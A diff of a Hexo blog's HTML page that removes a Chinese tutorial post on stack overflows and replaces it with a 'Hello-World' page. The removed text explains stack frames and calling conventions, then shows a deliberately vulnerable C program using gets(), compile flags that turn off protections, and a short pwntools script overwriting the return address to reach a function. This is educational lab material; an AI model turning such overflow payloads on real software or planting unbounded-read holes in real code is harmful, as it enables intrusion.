@@ -22,9 +22,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Pwn-栈溢出 - Hexo</title>
-  
-    <meta name="keywords" content="Pwn">
+  <title>Hello-World - Hexo</title>
   
 
   
@@ -431,7 +429,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title">
-        Pwn-栈溢出
+        Hello-World
       </h1>
       <div class='new-meta-box'>
         
@@ -448,13 +446,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
-  <div class='new-meta-item category'>
-    <a class='notlink'>
-      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/Pwn/">Pwn</a>
-    </a>
-  </div>
-
 
           
         
@@ -462,7 +453,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Oct 18, 2020</p>
+    <p>发布于：Apr 2, 2021</p>
   </a>
 </div>
 
@@ -473,7 +464,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="Pwn-栈溢出" data-path="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/">
+      <div id="lc-pv" data-title="Hello-World" data-path="/2021/04/02/Hello-World/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -491,129 +482,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h1 id="实现栈溢出的两个条件"><a href="#实现栈溢出的两个条件" class="headerlink" title="实现栈溢出的两个条件:"></a>实现栈溢出的两个条件:</h1><ul>
-<li>程序有向栈写入数据的行为</li>
-<li>程序并不限制写入数据的长度</li>
-</ul>
-<h1 id="ESP和EBP两个寄存器"><a href="#ESP和EBP两个寄存器" class="headerlink" title="ESP和EBP两个寄存器"></a>ESP和EBP两个寄存器</h1><p>如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的<strong>内容或地址</strong>, 并且要将程序控制权交给该指令。攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令。</p>
-<p>函数调用经常是<strong>嵌套</strong>的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个<strong>独立的连续区域</strong>, 称作**栈帧(Stack Frame)**。 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等。</p>
-<p>栈帧的边界由<strong>栈帧基地址指针EBP</strong>和<strong>栈帧堆栈指针ESP</strong>界定(指正存放在相应寄存器中)。 EBP指向<strong>栈帧底部(高地址)</strong>, 在当前栈帧内位置固定; ESP指向<strong>栈帧顶部(低地址)</strong>, 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量)。因此函数中对<strong>数据的访问</strong>大部分是基于EBP(通过记录对EBP的偏移量)。</p>
-<p><strong>ESP(Stack Pointer)是堆栈指针寄存器</strong>，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</p>
-<p><strong>EBP(Base Pointer)是栈帧基址指针</strong>寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p>
-<h1 id="函数调用时入栈顺序"><a href="#函数调用时入栈顺序" class="headerlink" title="函数调用时入栈顺序"></a>函数调用时入栈顺序</h1><p><strong>1.先压入的是实参以及返回地址，再将EBP寄存器中的值压入，最后压入被调函数中的变量</strong></p>
-<p>实参-&gt;主调函数返回地址-&gt;主调函数栈帧EBP-&gt;被调函数局部变量</p>
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018103710718.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018103710718.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018103710718"></p>
-<p>2.主调函数将参数按照调用约定依次入栈(上图为从右到左依次入栈)，然后<code>Return Address</code>指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)，压入返回地址时通过call是实现。</p>
-<p>3.进入被调函数时，被调函数将主调函数的<strong>帧基指针EBP</strong>入栈，并将主调函数的<strong>栈顶指针ESP</strong>值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。<strong>此时被调函数帧基指针指向被调函数的栈底。</strong></p>
-<p>4.被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。</p>
-<p>5.调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
-<p><strong>“leave;ret指令”该指令等价于“mov sp,bp; pop bp;ret”等指令执行完毕，站定指针被设置为bp所指向的值，改变bp的值，能起到到很多作用，如执行rop，扩展栈空间。</strong></p>
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201101122001473.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201101122001473.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201101122001473"></p>
-<p>6.例子：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Strt</span>&#123;</span></span><br><span class="line">     <span class="keyword">int</span> member1;</span><br><span class="line">     <span class="keyword">int</span> member2;</span><br><span class="line">     <span class="keyword">int</span> member3;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="keyword">int</span> para1, <span class="keyword">int</span> para2, <span class="keyword">int</span> para3)</span></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> locVar1 = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">int</span> locVar2 = <span class="number">2</span>;</span><br><span class="line">     <span class="keyword">int</span> locVar3 = <span class="number">3</span>;</span><br><span class="line">     <span class="keyword">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Strt</span> <span class="title">tStrt</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018133859545.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018133859545.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018133859545"></p>
-<p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，<strong>结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</strong></p>
-<h2 id="函数参数值传递与指针传递区别："><a href="#函数参数值传递与指针传递区别：" class="headerlink" title="函数参数值传递与指针传递区别："></a>函数参数值传递与指针传递区别：</h2><p>函数调用以值传递，传入实参与被函数内操作的形参两者的存储地址不同，因此被调函数无法直接修改主调函数实参值，为达到修改目的，需要向被调函数传递实参变量的指针（即变量的地址）。</p>
-<h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><h2 id="函数参数的传递顺序和方式"><a href="#函数参数的传递顺序和方式" class="headerlink" title="函数参数的传递顺序和方式"></a>函数参数的传递顺序和方式</h2><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p>
-<h2 id="栈的维护方式"><a href="#栈的维护方式" class="headerlink" title="栈的维护方式"></a>栈的维护方式</h2><p>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p>
-<h2 id="名字修饰策略"><a href="#名字修饰策略" class="headerlink" title="名字修饰策略"></a>名字修饰策略</h2><h3 id="又称函数名修饰-Decorated-Name-规则。编译器在链接时为区分不同函数，对函数名作不同修饰。"><a href="#又称函数名修饰-Decorated-Name-规则。编译器在链接时为区分不同函数，对函数名作不同修饰。" class="headerlink" title="又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。"></a>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</h3><p>   若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p>
-<h3 id="cdecl调用约定-函数参数从右往左的顺序入栈-函数调用者负责清除栈中的参数-返回值在EAX中"><a href="#cdecl调用约定-函数参数从右往左的顺序入栈-函数调用者负责清除栈中的参数-返回值在EAX中" class="headerlink" title="cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)"></a>cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)</h3><p>所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p>
-<table>
-<thead>
-<tr>
-<th><strong>调用方式</strong></th>
-<th><strong>stdcall(Win32)</strong></th>
-<th><strong>cdecl</strong></th>
-<th><strong>fastcall</strong></th>
-<th><strong>thiscall(C++)</strong></th>
-<th><strong>naked call</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>参数压栈顺序</strong></td>
-<td>从右至左</td>
-<td>从右至左</td>
-<td>从右至左，Arg1在ecx，Arg2在edx</td>
-<td>从右至左，this指针在ecx</td>
-<td>自定义</td>
-</tr>
-<tr>
-<td><strong>参数位置</strong></td>
-<td>栈</td>
-<td>栈</td>
-<td>栈 + 寄存器</td>
-<td>栈，寄存器ecx</td>
-<td>自定义</td>
-</tr>
-<tr>
-<td><strong>负责清栈的函数</strong></td>
-<td>被调函数</td>
-<td><strong>主调函数</strong></td>
-<td>被调函数</td>
-<td>被调函数</td>
-<td>自定义</td>
-</tr>
-<tr>
-<td><strong>支持可变参数</strong></td>
-<td>否</td>
-<td><strong>是</strong></td>
-<td>否</td>
-<td>否</td>
-<td>自定义</td>
-</tr>
-<tr>
-<td><strong>函数名字格式</strong></td>
-<td>_name@number</td>
-<td>_name</td>
-<td>@name@number</td>
-<td></td>
-<td>自定义</td>
-</tr>
-<tr>
-<td><strong>参数表开始标识</strong></td>
-<td>“@@YG”</td>
-<td>“@@YA”</td>
-<td>“@@YI”</td>
-<td></td>
-<td>自定义</td>
-</tr>
-<tr>
-<td>注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。</td>
-<td>Windows API默认的函数调用协议</td>
-<td>C/C++默认的函数调用协议</td>
-<td>适用于对性能要求较高的场合</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p><strong>x86程序</strong>：</p>
-<p>普通函数传参数：参数基本都压在栈上；</p>
-<p>syscall传参：eax对应系统调用号，ebx，ecx、edx、esi、edi、ebp分别对应前六个参数。多余的参数压在栈上。</p>
-<p><strong>x64程序：</strong></p>
-<p>普通函数传参数：先使用rdi、rsi、rdx、rcx、r8、r9寄存器作为函数参数的前六个参数，多余参数会一次压在栈上。</p>
-<p>syscall传参：rax对应系统调用号，传参规则和普通函数传参一致。</p>
-<p><strong>arm程序</strong>：</p>
-<p>RO、R1、R2、R3，依次对应前四个参数，多余的参数会一次压在栈上。</p>
-<p>—stacall和—fastcall这两种调用方式的传参规则如上表</p>
-<h1 id="基本的栈溢出操作"><a href="#基本的栈溢出操作" class="headerlink" title="基本的栈溢出操作"></a>基本的栈溢出操作</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//first.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译代码：不开启堆栈溢出保护，关闭 PIE（Position Independent Executable），避免加载基址被打乱</p>
-<p> <code>gcc -m32 -fno-stack-protector -no-pie first.c -o first</code></p>
-<p>用<code>checksec</code>查看</p>
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155424330.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155424330.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018155424330">没有开栈溢出保护以及随机地址</p>
-<p><strong>NX是栈不可执行保护已经打开</strong></p>
-<p>在IDA中看到<img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018153515033.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018153515033.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018153515033"></p>
-<p>该char字符距离栈底EBP有0x14也就是20个字节，根据函数栈的一个基本模型可以画出这个结构</p>
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154545316.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154545316.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018154545316"></p>
-<p>目的应该就是要覆盖调用函数的返回地址，这样的话要覆盖0X14+0X4个字节一共是24个字节，然后再加上一个返回地址</p>
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154745319.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154745319.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018154745319"></p>
-<p>由IDA可以看到success的首地址为0X08048456</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./first&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08048456</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + p32(success_addr)</span><br><span class="line"><span class="comment">#print p32(success_addr)</span></span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155219541.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155219541.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018155219541"></p>
-<p>最后运行到了success函数</p>
-<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1>
+  
   
   
     
@@ -630,7 +499,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
               
             
               
-                <p>本文永久链接是：<a href=http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/>http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</a></p>
+                <p>本文永久链接是：<a href=http://example.com/2021/04/02/Hello-World/>http://example.com/2021/04/02/Hello-World/</a></p>
               
             
           </blockquote>
@@ -647,10 +516,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T22:07:42+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-02T10:31:53+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Apr 1, 2021</p>
+    <p>更新于：Apr 2, 2021</p>
   </a>
 </div>
 
@@ -658,9 +527,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         
           
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwn/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwn</p></a></div>
-
 
         
       
@@ -672,7 +538,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=Pwn-栈溢出 - Hexo&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/04/02/Hello-World/&title=Hello-World - Hexo&summary="
           
           >
           
@@ -684,7 +550,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=Pwn-栈溢出 - Hexo&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/04/02/Hello-World/&title=Hello-World - Hexo&summary="
           
           >
           
@@ -696,7 +562,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/&title=Pwn-栈溢出 - Hexo&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/04/02/Hello-World/&title=Hello-World - Hexo&summary="
           
           >
           
@@ -726,18 +592,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Pwn-程序保护机制</p>
-          <p class='content'>STACK Canary栈溢出保护1.当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变...</p>
-        </a>
       
-      
-        <a class='next' href='/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/'>
-          <p class='title'>数据结构-二叉树<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1.树的定义1.树的节点：使用树结构存储的每一个数据元素被称为”节点“。
-图中每一个圆圈代表一个节点
-如果一个节点没有父节点，那么这个节点就是整棵树的根节点
-2.节点的度和层次对于一个节点，拥有...</p>
+        <a class='next' href='/2021/04/01/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/'>
+          <p class='title'>博客配置<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>设置一个评论系统注册leanCloud账号https://www.leancloud.cn/ 创建一个应用拿到里面的AppleID AppKey
+
+
+使用配置文档1234567891011121...</p>
         </a>
       
     </div>
@@ -770,20 +631,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
-    
-  <header>
-    
-      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
-    
-  </header>
-
-
-    <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%9D%A1%E4%BB%B6"><span class="toc-text">实现栈溢出的两个条件:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESP%E5%92%8CEBP%E4%B8%A4%E4%B8%AA%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">ESP和EBP两个寄存器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F"><span class="toc-text">函数调用时入栈顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E5%80%BC%E4%BC%A0%E9%80%92%E4%B8%8E%E6%8C%87%E9%92%88%E4%BC%A0%E9%80%92%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-text">函数参数值传递与指针传递区别：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-text">函数调用约定</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E9%A1%BA%E5%BA%8F%E5%92%8C%E6%96%B9%E5%BC%8F"><span class="toc-text">函数参数的传递顺序和方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E7%9A%84%E7%BB%B4%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-text">栈的维护方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8D%E5%AD%97%E4%BF%AE%E9%A5%B0%E7%AD%96%E7%95%A5"><span class="toc-text">名字修饰策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%88%E7%A7%B0%E5%87%BD%E6%95%B0%E5%90%8D%E4%BF%AE%E9%A5%B0-Decorated-Name-%E8%A7%84%E5%88%99%E3%80%82%E7%BC%96%E8%AF%91%E5%99%A8%E5%9C%A8%E9%93%BE%E6%8E%A5%E6%97%B6%E4%B8%BA%E5%8C%BA%E5%88%86%E4%B8%8D%E5%90%8C%E5%87%BD%E6%95%B0%EF%BC%8C%E5%AF%B9%E5%87%BD%E6%95%B0%E5%90%8D%E4%BD%9C%E4%B8%8D%E5%90%8C%E4%BF%AE%E9%A5%B0%E3%80%82"><span class="toc-text">又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 